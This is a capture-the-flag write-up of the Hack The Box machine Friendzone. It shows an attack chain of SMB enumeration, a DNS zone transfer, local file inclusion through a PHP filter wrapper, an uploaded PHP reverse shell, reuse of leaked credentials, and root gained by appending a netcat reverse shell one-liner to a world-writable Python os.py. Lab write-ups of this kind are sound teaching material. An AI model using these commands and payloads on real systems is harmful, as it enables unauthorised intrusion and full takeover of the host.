---
title: Friendzone
date: 2023-01-19 13:30:03 -5000
categories: [OSCP Prep,HTB Linux Retired]
tags: [Network,Web,PHP,Source Code Analysis,Authentication,SMB,DNS,Local File Inclusion,Password Reuse,Protocols,Anonymous,Zone Transfer,Sensitive Data Exposure]
---
# Friendzone
![Friendzone.png](/Assets/Pictures/FriendZone.png)
Another HTB machine from TJNull’s list in the easy Linux category. 
One box a day minimum.

# Intelligence Gathering

Here are the open TCP ports on the victim’s machine.

```bash
PORT    STATE SERVICE      REASON
21/tcp  open  ftp          syn-ack ttl 63
22/tcp  open  ssh          syn-ack ttl 63
53/tcp  open  domain       syn-ack ttl 63
80/tcp  open  http         syn-ack ttl 63
139/tcp open  netbios-ssn  syn-ack ttl 63
443/tcp open  https        syn-ack ttl 63
445/tcp open  microsoft-ds syn-ack ttl 63
```

Here are the open and filtered UDP ports on the victim’s machine.

```bash
PORT      STATE         SERVICE     REASON                                                                                                                                                                        
53/udp    open          domain      udp-response ttl 63
137/udp   open          netbios-ns  udp-response ttl 63
138/udp   open|filtered netbios-dgm no-response
513/udp   open|filtered who         no-response
9950/udp  open|filtered apc-9950    no-response
16711/udp open|filtered unknown     no-response
18994/udp open|filtered unknown     no-response
19936/udp open|filtered unknown     no-response
20464/udp open|filtered unknown     no-response
21366/udp open|filtered unknown     no-response
24511/udp open|filtered unknown     no-response
32815/udp open|filtered unknown     no-response
57409/udp open|filtered unknown     no-response
```

Let’s look at the service versions of all these ports except SSH port 22.

```bash
PORT    STATE SERVICE     REASON         VERSION                                                                                                                                                                  
21/tcp  open  ftp         syn-ack ttl 63 vsftpd 3.0.3                                                                                                                                                             
53/tcp  open  domain      syn-ack ttl 63 ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)                                                                                                                                
| dns-nsid:                                                                                                                                                                                                       
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu                                                                                                                                                                        
80/tcp  open  http        syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))                                                                                                                                           
| http-methods:                                                                                                                                                                                                   
|_  Supported Methods: POST OPTIONS HEAD GET                                                                                                                                                                      
|_http-server-header: Apache/2.4.29 (Ubuntu)                                                                                                                                                                      
|_http-title: Friend Zone Escape software                                                                                                                                                                         
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                                                                                                                              
443/tcp open  ssl/http    syn-ack ttl 63 Apache httpd 2.4.29                                                                                                                                                      
| http-methods:                                                                                                                                                                                                   
|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                                                                      
|_http-server-header: Apache/2.4.29 (Ubuntu)                                                                                                                                                                      
|_http-title: 404 Not Found                                                                                                                                                                                       
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO/emailAddress=haha@friendzone.red/localityName=AMMAN/organizationalUnitName=CODERED             
| Issuer: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO/emailAddress=haha@friendzone.red/localityName=AMMAN/organizationalUnitName=CODERED                        
| Public Key type: rsa                                                                                                                                                                                            
| Public Key bits: 2048                                                                                                                                                                                           
| Signature Algorithm: sha256WithRSAEncryption                                                                                                                                                                    
| Not valid before: 2018-10-05T21:02:30                                                                                                                                                                           
| Not valid after:  2018-11-04T21:02:30                                                                                                                                                                           
| MD5:   c144 1868 5e8b 468d fc7d 888b 1123 781c                                                                                                                                                                  
| SHA-1: 88d2 e8ee 1c2c dbd3 ea55 2e5e cdd4 e94c 4c8b 9233                                                                                                                                                        
| -----BEGIN CERTIFICATE-----                                                                                                                                                                                     
| MIID+DCCAuCgAwIBAgIJAPRJYD8hBBg0MA0GCSqGSIb3DQEBCwUAMIGQMQswCQYD                                                                                                                                                
| VQQGEwJKTzEQMA4GA1UECAwHQ09ERVJFRDEOMAwGA1UEBwwFQU1NQU4xEDAOBgNV                                                                                                                                                
| BAoMB0NPREVSRUQxEDAOBgNVBAsMB0NPREVSRUQxFzAVBgNVBAMMDmZyaWVuZHpv                                                                                                                                                
| bmUucmVkMSIwIAYJKoZIhvcNAQkBFhNoYWhhQGZyaWVuZHpvbmUucmVkMB4XDTE4                                                                                                                                                
| MTAwNTIxMDIzMFoXDTE4MTEwNDIxMDIzMFowgZAxCzAJBgNVBAYTAkpPMRAwDgYD                                                                                                                                                
| VQQIDAdDT0RFUkVEMQ4wDAYDVQQHDAVBTU1BTjEQMA4GA1UECgwHQ09ERVJFRDEQ                                                                                                                                                
| MA4GA1UECwwHQ09ERVJFRDEXMBUGA1UEAwwOZnJpZW5kem9uZS5yZWQxIjAgBgkq                                                                                                                                                
| hkiG9w0BCQEWE2hhaGFAZnJpZW5kem9uZS5yZWQwggEiMA0GCSqGSIb3DQEBAQUA                                                                                                                                                
| A4IBDwAwggEKAoIBAQCjImsItIRhGNyMyYuyz4LWbiGSDRnzaXnHVAmZn1UeG1B8                                                                                                                                                
| lStNJrR8/ZcASz+jLZ9qHG57k6U9tC53VulFS+8Msb0l38GCdDrUMmM3evwsmwrH                                                                                                                                                
| 9jaB9G0SMGYiwyG1a5Y0EqhM8uEmR3dXtCPHnhnsXVfo3DbhhZ2SoYnyq/jOfBuH
| gBo6kdfXLlf8cjMpOje3dZ8grwWpUDXVUVyucuatyJam5x/w9PstbRelNJm1gVQh                                                                                                                                                
| 7xqd2at/kW4g5IPZSUAufu4BShCJIupdgIq9Fddf26k81RQ11dgZihSfQa0HTm7Q                                                                                                                                                
| ui3/jJDpFUumtCgrzlyaM5ilyZEj3db6WKHHlkCxAgMBAAGjUzBRMB0GA1UdDgQW
| BBSZnWAZH4SGp+K9nyjzV00UTI4zdjAfBgNVHSMEGDAWgBSZnWAZH4SGp+K9nyjz
| V00UTI4zdjAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBV6vjj
| TZlc/bC+cZnlyAQaC7MytVpWPruQ+qlvJ0MMsYx/XXXzcmLj47Iv7EfQStf2TmoZ
| LxRng6lT3yQ6Mco7LnnQqZDyj4LM0SoWe07kesW1GeP9FPQ8EVqHMdsiuTLZryME
| K+/4nUpD5onCleQyjkA+dbBIs+Qj/KDCLRFdkQTX3Nv0PC9j+NYcBfhRMJ6VjPoF
| Kwuz/vON5PLdU7AvVC8/F9zCvZHbazskpy/quSJIWTpjzg7BVMAWMmAJ3KEdxCoG
| X7p52yPCqfYopYnucJpTq603Qdbgd3bq30gYPwF6nbHuh0mq8DUxD9nPEcL8q6XZ
| fv9s+GxKNvsBqDBX
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
| nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   FRIENDZONE<00>       Flags: <unique><active>
|   FRIENDZONE<03>       Flags: <unique><active>
|   FRIENDZONE<20>       Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 60332/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 41507/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 48366/udp): CLEAN (Failed to receive data)
|   Check 4 (port 37865/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-01-19T09:55:17
|_  start_date: N/A
```

Now that we are done enumerating the ports, let’s enumerate them individually starting by the lowest hanging fruit. The most juicy one first. SSH is not on the list

# Enumeration

## SMB/SAMBA Enumeration

SMB is one of the lowest hanging fruit. Let’s enumerate this service. First let’s map different share on the victims with smbmap

```bash
➜  smbmap -H 10.10.10.123
[+] Guest session       IP: 10.10.10.123:445    Name: 10.10.10.123                                      
        Disk                     Permissions     Comment
        ----                     -----------     -------
        print$                   NO ACCESS       Printer Drivers
        Files                    NO ACCESS       FriendZone Samba Server Files /etc/Files
        general                  READ ONLY       FriendZone Samba Server Files
        Development              READ, WRITE     FriendZone Samba Server Files
        IPC$                     NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
```

2 shares caught our attention here, general and development. Because of the permissions we have as anonymous client on this server. Now it’s time to enumerate those disks by login without passwords. we will start with general first.

```bash
➜  smbclient -N \\\\10.10.10.123\\general
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jan 16 13:10:51 2019
  ..                                  D        0  Tue Sep 13 08:56:24 2022
  creds.txt                           N       57  Tue Oct  9 17:52:42 2018
#We found some credentials on the server, let get them and read them
smb: \> get creds.txt
getting file \creds.txt of size 57 as creds.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
```

Looking at the creds, we found the administrator password inside of the file.

```bash
➜  cat creds.txt 
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```

for now we don’t know where to use those creds yet. But we surely going to keep them. Let’s enumerate the development disk.

```bash
➜  smbclient -N \\\\10.10.10.123\\development
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Jan 19 04:03:53 2023
  ..                                  D        0  Tue Sep 13 08:56:24 2022

                3545824 blocks of size 1024. 1651384 blocks available
```

As we can see, this disk is empty so far. Having the write and read permission on it, let’s keep that in mind.

Let’s move on to another service to enumerate.

## Web Enumeration

Now time to visit and enumerate the web server on 80 and 443.

Here what the webserver looks like on port 80.

![Untitled](/Assets/Pictures/Friendzone/Untitled.png)

yes, we have all been there at some points in our lives. Good things start there too by the way 😉

Let’s get back to hacking 😅

Looking at the port enumeration and this website, we got the hostname of the web server. Let’s add it to our host.

```bash
➜  echo "10.10.10.123    friendzone.red" | sudo tee -a /etc/hosts
[sudo] password for retr0x01: 
10.10.10.123    friendzone.red
```

After adding the hostname, when we visit the website `[http://friendzone.red](http://friendzone.red)` it’s still the same page. But when we access `[https://friendzone.red](https://friendzone.red)` we get a different result.

![Untitled](/Assets/Pictures/Friendzone/Untitled%201.png)

Looking at the source it hints us that this is probably a rabbit hole. Let’s see !

```html
<!-- Just doing some development here -->
<!-- /js/js -->
<!-- Don't go deep ;) -->
```

Since we are enumerating the web, let’s go ahead and get more info by fuzzing the directories first and look for a subdomain. since the port 53 is open. Let’s start with directory busting.

Here is what we found.

```bash
[04:31:01] 200 -  324B  - /index.html
[04:31:02] 200 -   11KB - /index.bak
[04:31:17] 200 -   13B  - /robots.txt
[04:31:27] 200 -  749B  - /wordpress/
```

robots.txt shows the following

```html
seriously ?!
```

/wordpress/ shows an empty directory.

![Untitled](/Assets/Pictures/Friendzone/Untitled%202.png)

an empty directory which suggests that there is or there was a wordpress installed on this webserver.

Let’s enumerate the webserver and look for subdomains. there was no subdomain found with fuzzing method.

Let’s go on and enumerate another service.

## Domain Enumeration

Now, let’s enumerate the domain which sits at port 53 with the help of `dig`.

Since we know the hostname and have its I.P address, let’s try to get the zone transfer details.

```bash
➜  dig axfr @10.10.10.123 friendzone.red

; <<>> DiG 9.18.1-1ubuntu1.2-Ubuntu <<>> axfr @10.10.10.123 friendzone.red
; (1 server found)
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 427 msec
;; SERVER: 10.10.10.123#53(10.10.10.123) (TCP)
;; WHEN: Thu Jan 19 05:51:47 CST 2023
;; XFR size: 8 records (messages 1, bytes 289)
```

seems like we found 3 different subdomain of the webserver which are `administrator1.friendzone.red`. Let’s add them to our hostfile and access those pages. Accessing them via HTPP/80 was not successful but accessing them via HTTPS/443 was successful except for `https://hr.friendzone.htb`.

Here is what the webpage of uploads looks like.

![Untitled](/Assets/Pictures/Friendzone/Untitled%203.png)

It seems like we can only upload images. Let’s keep that in mind and move on to visit the administrator1 subdomain. Here is how the page looks like.

![Untitled](/Assets/Pictures/Friendzone/Untitled%204.png)

We got an admin log in panel. This is where we can use the credentials found earlier in our enumeration.

Now we are inside a restricted area.

![Untitled](/Assets/Pictures/Friendzone/Untitled%205.png)

After entering the right endpoint, here is what we got.

![Untitled](/Assets/Pictures/Friendzone/Untitled%206.png)

Let’s follow the given instruction and see what’s next. Because from now it seems blurry 😅

Let’s add the default image into our url and see what’s going on.

![Untitled](/Assets/Pictures/Friendzone/Untitled%207.png)

we are being trolled. OK !

let’s first get the given timestamp that leaked, and let’s try with a different file name. So instead of `a.jpg`, let’s try it with `b.jpg`.

It worked and we got the following.

![Untitled](/Assets/Pictures/Friendzone/Untitled%208.png)

Here is the list of images, that’s under `/images`.

![Untitled](/Assets/Pictures/Friendzone/Untitled%209.png)

So now we have an idea of what’s going on, on the server. we have a local file inclusion here. After some research we found an interesting [article](https://infinitelogins.com/2020/04/25/lfi-php-wrappers-to-obtain-source-code/) showing us the same box 😂 Now let’s use this technique to get the source code of the web app.

According to the article we need a PHP wrapper in order to be able to read local files.

```bash
php://filter/convert.base64-encode/resource=<filename>
```

let’s try it.

# Foothold

In our case pagename is the vulnerable parameter since it’s the parameter that reads the file on the system. let’s exploit it and look for different files/directories. To make sure we got all the possible directories on the webapp, let’s fuzz it.

```bash
_____________________________________________________________________
 :: Method           : GET                                                                            
 :: URL              : https://administrator1.friendzone.red/FUZZ.php                                 
 :: Wordlist         : FUZZ: /home/retr0x01/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10 
 :: Threads          : 90 
 :: Matcher          : Response status: 200
____________________________________________________________________
login                   [Status: 200, Size: 7, Words: 2, Lines: 1]
dashboard               [Status: 200, Size: 101, Words: 12, Lines: 1]
timestamp               [Status: 200, Size: 36, Words: 5, Lines: 1]
```

As we can see here, the app is calling the timestamp.php file and read the time for the first time on that file.

![Untitled](/Assets/Pictures/Friendzone/Untitled%207.png)

Now let’s exploit the vulnerability by trying to read the dashboard.php file.

![Untitled](/Assets/Pictures/Friendzone/Untitled%2010.png)

We got a long base64 string that contains our source code of the `dahsboard.php` file. Let’s decode it and read it. We will surely find some useful information doing it for all 3 source code we found. Here is how we got one of them, converted it and saved it to a file.

```bash
➜  echo "PD9waHAKCi8vZWNobyAiPGNlbnRlcj48aDI+U21hcnQgcGhvdG8gc2NyaXB0IGZvciBmcmllbmR6b25lIGNvcnAgITwvaDI+PC9jZW50ZXI+IjsKLy9lY2hvICI8Y2VudGVyPjxoMz4qIE5vdGUgOiB3ZSBhcmUgZGVhbGluZyB3aXRoIGEgYmVnaW5uZXIgcGhwIGRldmVsb3BlciBhbmQgdGhlIGFwcGxpY2F0aW9uIGlzIG5vdCB0ZXN0ZWQgeWV0ICE8L2gzPjwvY2VudGVyPiI7CmVjaG8gIjx0aXRsZT5GcmllbmRab25lIEFkbWluICE8L3RpdGxlPiI7CiRhdXRoID0gJF9DT09LSUVbIkZyaWVuZFpvbmVBdXRoIl07CgppZiAoJGF1dGggPT09ICJlNzc0OWQwZjRiNGRhNWQwM2U2ZTkxOTZmZDFkMThmMSIpewogZWNobyAiPGJyPjxicj48YnI+IjsKCmVjaG8gIjxjZW50ZXI+PGgyPlNtYXJ0IHBob3RvIHNjcmlwdCBmb3IgZnJpZW5kem9uZSBjb3JwICE8L2gyPjwvY2VudGVyPiI7CmVjaG8gIjxjZW50ZXI+PGgzPiogTm90ZSA6IHdlIGFyZSBkZWFsaW5nIHdpdGggYSBiZWdpbm5lciBwaHAgZGV2ZWxvcGVyIGFuZCB0aGUgYXBwbGljYXRpb24gaXMgbm90IHRlc3RlZCB5ZXQgITwvaDM+PC9jZW50ZXI+IjsKCmlmKCFpc3NldCgkX0dFVFsiaW1hZ2VfaWQiXSkpewogIGVjaG8gIjxicj48YnI+IjsKICBlY2hvICI8Y2VudGVyPjxwPmltYWdlX25hbWUgcGFyYW0gaXMgbWlzc2VkICE8L3A+PC9jZW50ZXI+IjsKICBlY2hvICI8Y2VudGVyPjxwPnBsZWFzZSBlbnRlciBpdCB0byBzaG93IHRoZSBpbWFnZTwvcD48L2NlbnRlcj4iOwogIGVjaG8gIjxjZW50ZXI+PHA+ZGVmYXVsdCBpcyBpbWFnZV9pZD1hLmpwZyZwYWdlbmFtZT10aW1lc3RhbXA8L3A+PC9jZW50ZXI+IjsKIH1lbHNlewogJGltYWdlID0gJF9HRVRbImltYWdlX2lkIl07CiBlY2hvICI8Y2VudGVyPjxpbWcgc3JjPSdpbWFnZXMvJGltYWdlJz48L2NlbnRlcj4iOwoKIGVjaG8gIjxjZW50ZXI+PGgxPlNvbWV0aGluZyB3ZW50IHdvcm5nICEgLCB0aGUgc2NyaXB0IGluY2x1ZGUgd3JvbmcgcGFyYW0gITwvaDE+PC9jZW50ZXI+IjsKIGluY2x1ZGUoJF9HRVRbInBhZ2VuYW1lIl0uIi5waHAiKTsKIC8vZWNobyAkX0dFVFsicGFnZW5hbWUiXTsKIH0KfWVsc2V7CmVjaG8gIjxjZW50ZXI+PHA+WW91IGNhbid0IHNlZSB0aGUgY29udGVudCAhICwgcGxlYXNlIGxvZ2luICE8L2NlbnRlcj48L3A+IjsKfQo/Pgo=" | base64 -d > dashboard.php
```

Sadly all this source code doesn’t show where those files are located. Then we remembered that we got smb open. We need to go back since we have a writable directory development, we can upload our reverse shell there and access it with vulnerability.

There is a recursive way to enumerate SMB that could give us file path and contents of directories.

```bash
smbmap -H 10.10.10.123 -R (Recursive)
#Results
[+] Guest session       IP: 10.10.10.123:445    Name: friendzone.red                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files
        general                                                 READ ONLY       FriendZone Samba Server Files
        .\general\*
        dr--r--r--                0 Wed Jan 16 13:10:51 2019    .
        dr--r--r--                0 Tue Sep 13 08:56:24 2022    ..
        fr--r--r--               57 Tue Oct  9 17:52:42 2018    creds.txt
        Development                                             READ, WRITE     FriendZone Samba Server Files
        .\Development\*
        dr--r--r--                0 Thu Jan 19 07:29:09 2023    .
        dr--r--r--                0 Tue Sep 13 08:56:24 2022    ..
        fr--r--r--             2585 Thu Jan 19 06:54:42 2023    rev.php
        IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
```

The disk Files leaked the location of all the FriendZone Samba Server Files which is `/etc/Files`.

So to access general or document we can just locate ourselves to `/etc/general or /etc/development`. With that in mind let’s upload our reverse shell in the development disk and access it using this LFI vulnerability. And as you can see we uploaded the shell name `rev.php`.

# User

We finally uploaded our shell, we can now trigger the reverse shell by accessing that webpage.

`https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/rev`

```bash
➜  nc -nvlp 9001
Listening on 0.0.0.0 9001
Connection received on 10.10.10.123 35148
Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 15:40:36 up  3:56,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (755): Inappropriate ioctl for device
bash: no job control in this shell
www-data@FriendZone:/$ whoami
whoami
www-data
www-data@FriendZone:/$ hostname
hostname
FriendZone
www-data@FriendZone:/$
```

We were able to get the user flag and found a user on the system, we will need to python as friend, since we are logged in as www-data. In order to do that we will  need to enumerate and gather more information on the box. while enumerating the `/var/www` file seemed to gave some juicy information

```bash
www-data@FriendZone:/var/www$ ls -l
ls -l
total 28
drwxr-xr-x 3 root root 4096 Sep 13 17:53 admin
drwxr-xr-x 4 root root 4096 Sep 13 17:53 friendzone
drwxr-xr-x 2 root root 4096 Sep 13 17:53 friendzoneportal
drwxr-xr-x 2 root root 4096 Sep 13 17:53 friendzoneportaladmin
drwxr-xr-x 3 root root 4096 Sep 13 17:53 html
-rw-r--r-- 1 root root  116 Oct  6  2018 mysql_data.conf
drwxr-xr-x 3 root root 4096 Sep 13 17:53 uploads
www-data@FriendZone:/var/www$ cat mysql_data.conf
cat mysql_data.conf
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
```

We found friend credentials, `friend:Agpyu12!0.213$`.

We remember having ssh open on the victim’s machine. Let’s try to reuse the sql password for ssh. As we can see it worked !

```bash
➜  ssh friend@10.10.10.123  
The authenticity of host '10.10.10.123 (10.10.10.123)' can't be established.
ED25519 key fingerprint is SHA256:ERMyoo9aM0mxdTvIh0kooJS+m3GwJr6Q51AG9/gTYx4.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.123' (ED25519) to the list of known hosts.
friend@10.10.10.123's password: 
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

You have mail.
Last login: Thu Jan 24 01:20:15 2019 from 10.10.14.3
friend@FriendZone:~$
```

Now with a more stable shell, we can enumerate more to look for a way to escalate our privileges to those of the system. Firstly we noticed that friend is not a sudoer. Now let’s look for vulnerable SUID on the machine.

```bash
friend@FriendZone:~$ find / -perm -u+s -type f 2>/dev/null 
/bin/fusermount
/bin/umount
/bin/mount
/bin/su
/bin/ntfs-3g
/bin/ping
/usr/bin/passwd
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/chfn
/usr/sbin/exim4
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
```

The SUID technique did not leading to anything serious

# Privesc

At this point we need to put all the luck on our side. So, let’s first upload `linpeas.sh` on the target. Once uploaded we can run it against our victim. Sadly, with linpeas we did not get anything promising. The next path is look at hidden processes with `pspy64`. After uploading it, we start it and found the following.

![Untitled](/Assets/Pictures/Friendzone/Untitled%2011.png)

so the root user is running the following python script **`/bin/sh -c /opt/server_admin/reporter.py`.** This is interesting to us because we can escalate the privileges with a command injection, by injection a malicious.

Luckily for us, we have the reading permission.

```bash
friend@FriendZone:/opt/server_admin$ ls -l
total 4
-rwxr--r-- 1 root root 424 Jan 16  2019 reporter.py
```

With those permission we can read the content of reporter.py

```bash
friend@FriendZone:/opt/server_admin$ cat reporter.py 
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```

As we can see the code is an unfinished one, but most importantly it’s importing the os module. From this point let’s find the `os.py` file to see the permissions and to see if we can hijack the file and insert a malicious code.

```bash
friend@FriendZone:/opt/server_admin$ find / -type f -name os.py 2>/dev/null 
/usr/lib/python3.6/os.py
/usr/lib/python2.7/os.py
friend@FriendZone:/opt/server_admin$ ls -l /usr/lib/python3.6/os.py
-rw-r--r-- 1 root root 37526 Sep 12  2018 /usr/lib/python3.6/os.py (just readable)
friend@FriendZone:/opt/server_admin$ ls -l /usr/lib/python2.7/os.py
-rwxrwxrwx 1 root root 25910 Jan 15  2019 /usr/lib/python2.7/os.py (ALL)
```

so we found the file that can be modified and the file we can inject our malicious code `/usr/lib/python2.7/os.py`.

Let’s prepare our injection for a module hijacking.

```bash
friend@FriendZone:/usr/lib/python2.7$ echo "system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.16.8 9001 >/tmp/f\")" >> os.py
```

With this line in our `os.py` we can just wait and see until the next execution of the cron job. We will wait with our netcat listening to the port `9001`.

Voila !  We got a shell as root and the box has been fully exploited.

```bash
➜  nc -nlvp 9001
Listening on 0.0.0.0 9001                                                                       
Connection received on 10.10.10.123 59440
bash: cannot set terminal process group (1151): Inappropriate ioctl for device
bash: no job control in this shell
root@FriendZone:~# whoami;hostname -I;id
whoami;hostname -I;id
root
10.10.10.123 dead:beef::250:56ff:feb9:9eff 
uid=0(root) gid=0(root) groups=0(root)
```

Thanks for reading, enjoy and may be the force be with you all !
